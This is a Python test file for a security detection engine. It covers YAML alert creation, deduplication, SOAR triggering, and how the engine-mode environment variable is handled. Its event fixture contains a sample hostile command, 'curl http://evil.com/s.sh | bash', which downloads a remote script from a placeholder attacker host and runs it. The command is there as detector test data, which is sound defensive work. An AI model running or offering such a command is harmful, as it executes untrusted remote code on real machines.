"""
Regression tests proving the YAML-only migration invariants hold:
  1. YAML alerts still create correctly.
  2. Duplicate YAML alerts are still skipped.
  3. SOAR auto-run still triggers after alert creation.
  4. DETECTION_ENGINE_MODE=LEGACY is ignored — routes to ActiveDetectionRunner.
  5. DETECTION_ENGINE_MODE=SHADOW is ignored — routes to ActiveDetectionRunner only.
"""
import os
import pytest
from unittest.mock import MagicMock, patch, call

from app.detection.engine.yaml_detection_engine import DetectionCandidate
from app import models


def _make_candidate(**kwargs) -> DetectionCandidate:
    defaults = dict(
        rule_id="test_rule_001",
        rule_name="Test Rule",
        matched=True,
        suppressed=False,
        severity="HIGH",
        risk_score=75,
        base_risk_score=50,
        match_reasons=["process.name matched"],
        mitre={
            "tactic": {"id": "TA0002", "name": "Execution"},
            "technique": {"id": "T1059.004", "name": "Unix Shell"},
        },
    )
    defaults.update(kwargs)
    return DetectionCandidate(**defaults)


def _make_event(**kwargs) -> dict:
    defaults = dict(
        agent_id="agent-001",
        hostname="host-1",
        message="type=EXECVE msg=audit(1234567890.000:1) a0=bash a1=-c a2='curl http://evil.com/s.sh | bash'",
        process={"command_line": "curl http://evil.com/s.sh | bash"},
    )
    defaults.update(kwargs)
    return defaults


class TestYamlAlertCreation:
    def test_yaml_alert_is_created_for_matching_event(self):
        """_create_alert() must persist a models.Alert with detection_engine='YAML'."""
        from app.detection.engine.active_runner import ActiveDetectionRunner

        mock_db = MagicMock()
        # No existing dedup hit
        mock_db.query.return_value.filter.return_value.first.return_value = None

        runner = ActiveDetectionRunner(db=mock_db)
        candidate = _make_candidate()
        event = _make_event()

        with patch("app.detection.engine.active_runner.trigger_soar_auto_run_for_alert"):
            runner._create_alert(event, candidate)

        mock_db.add.assert_called_once()
        added = mock_db.add.call_args[0][0]
        assert isinstance(added, models.Alert)
        assert added.detection_engine == "YAML"
        assert added.rule_id == "test_rule_001"
        assert added.severity == "HIGH"
        assert added.risk_score == 75

    def test_alert_dedup_key_is_set(self):
        """Created alert must have a non-empty dedup_key."""
        from app.detection.engine.active_runner import ActiveDetectionRunner

        mock_db = MagicMock()
        mock_db.query.return_value.filter.return_value.first.return_value = None

        runner = ActiveDetectionRunner(db=mock_db)
        with patch("app.detection.engine.active_runner.trigger_soar_auto_run_for_alert"):
            runner._create_alert(_make_event(), _make_candidate())

        added = mock_db.add.call_args[0][0]
        assert added.dedup_key and added.dedup_key.startswith("yaml:")


class TestYamlAlertDedup:
    def test_duplicate_alert_is_skipped(self):
        """When a dedup_key already exists in DB, db.add() must not be called."""
        from app.detection.engine.active_runner import ActiveDetectionRunner

        mock_db = MagicMock()
        # Simulate an existing alert row matching the dedup key
        mock_db.query.return_value.filter.return_value.first.return_value = MagicMock()

        runner = ActiveDetectionRunner(db=mock_db)
        runner._create_alert(_make_event(), _make_candidate())

        mock_db.add.assert_not_called()
        mock_db.commit.assert_not_called()


class TestSoarTriggeredAfterAlert:
    def test_soar_auto_run_called_with_alert_id(self):
        """trigger_soar_auto_run_for_alert() must be called with the new alert.id."""
        from app.detection.engine.active_runner import ActiveDetectionRunner

        mock_db = MagicMock()
        mock_db.query.return_value.filter.return_value.first.return_value = None

        created_alerts = []

        def capture_add(obj):
            if isinstance(obj, models.Alert):
                obj.id = 99
                created_alerts.append(obj)

        mock_db.add.side_effect = capture_add
        mock_db.commit.return_value = None

        with patch("app.detection.engine.active_runner.trigger_soar_auto_run_for_alert") as mock_soar:
            runner = ActiveDetectionRunner(db=mock_db)
            runner._create_alert(_make_event(), _make_candidate())

        assert len(created_alerts) == 1
        mock_soar.assert_called_once_with(99, mock_db)


class TestLegacyModeDisabled:
    def test_legacy_env_var_routes_to_active_runner(self):
        """DETECTION_ENGINE_MODE=LEGACY must still call ActiveDetectionRunner.run()."""
        from app.detection.engine.detection_engine import RuleEngine
        from app.detection.engine.active_runner import ActiveDetectionRunner

        mock_db = MagicMock()
        with patch.dict(os.environ, {"DETECTION_ENGINE_MODE": "LEGACY"}):
            with patch.object(ActiveDetectionRunner, "run") as mock_run:
                with patch("app.detection.engine.detection_engine.AuditdParser.normalize_log", side_effect=lambda x: x):
                    RuleEngine(db=mock_db).evaluate_raw({"log_type": "auditd", "message": "test"})
                mock_run.assert_called_once()

    def test_shadow_env_var_routes_to_active_runner_only(self):
        """DETECTION_ENGINE_MODE=SHADOW must still call ActiveDetectionRunner.run() (no shadow side-effect)."""
        from app.detection.engine.detection_engine import RuleEngine
        from app.detection.engine.active_runner import ActiveDetectionRunner

        mock_db = MagicMock()
        with patch.dict(os.environ, {"DETECTION_ENGINE_MODE": "SHADOW"}):
            with patch.object(ActiveDetectionRunner, "run") as mock_run:
                with patch("app.detection.engine.detection_engine.AuditdParser.normalize_log", side_effect=lambda x: x):
                    RuleEngine(db=mock_db).evaluate_raw({"log_type": "auditd", "message": "test"})
                mock_run.assert_called_once()
